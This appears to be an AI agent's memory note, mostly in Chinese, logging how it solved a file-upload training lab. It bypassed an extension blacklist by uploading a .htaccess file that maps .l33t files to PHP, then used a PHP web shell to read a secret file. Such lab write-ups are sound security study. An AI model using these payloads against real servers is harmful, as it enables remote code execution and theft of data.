---
metadata:
  node_type: memory
name: "Lab A-arm: file-upload extension blacklist bypass"
description: "A-arm实录:根因=黑名单不完整(.htaccess 未禁),AddType 映射 .l33t → PHP 执行,读出 /home/carlos/secret 并提交,correct:true + 横幅 solved"
last_updated: 2026-10-10T02:07:40+08:00
created: 2026-10-10T02:07:40+08:00
---

## 2026-10-09 lab-file-upload-web-shell-upload-via-extension-blacklist-bypass (arm A) — solved

实例: https://0abd0003046ab90881bc61f600fa00b8.web-security-academy.net/ (range_launch launch-url /web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass, jar /tmp/cj1.json, reused:false)

路径:
1. page_read 读题面(开卷族,题面即方法): 目标=传 PHP web shell 绕过扩展名黑名单,读 /home/carlos/secret 并通过横幅按钮提交;凭据 wiener:peter。
2. http_session get /login → csrf TbPK2ChONdfkv2NNn7M4lik0zKdgX7l0;post /login (csrf/username=wiener/password=peter) → 302 /my-account?id=wiener,新会话 cookie;表单 POST /my-account/avatar,字段 avatar(file)+user=wiener+csrf=z6JnwQaifPId4gbh2h2VKhkBdzospcrn。
3. 黑名单探测: upload shell.php (type image/jpeg) → 403 空体,确认扩展名被拒。
4. 根因利用: 黑名单只挡脚本扩展、没挡目录配置文件 → upload `.htaccess`(内容 `AddType application/x-httpd-php .l33t`)→ 200;再 upload `shell.l33t`(内容 `<?php echo file_get_contents('/home/carlos/secret'); ?>`)→ 200。
5. GET /files/avatars/shell.l33t → 200,体长 32 = secret `kDx9tJGYyVZH0XazZxM76GyUCHAEnAgP`。
6. POST /submitSolution answer=<secret> → `{"correct":true}`;banner_verdict → solved:true, "<h4>Congratulations, you solved the lab!</h4>"。

要点:
- 黑名单型上传判定的第一问是"配置面是否也在白名单判定内":.htaccess 未列入黑名单=可改 Apache 处理器映射,任意扩展名变 PHP。
- upload 件的文件名靠 --filename <字段>=<名字> 指定,本地路径名无关;.htaccess 需带点前缀,不能用默认 basename。
- upload/http_session 对 gzip 响应体可能给空 body(仅 200 可判成功);判读成功与否看状态码,不看 body。
- 提交后除 JSON correct 外,再取一次横幅文本作为翻牌证据。

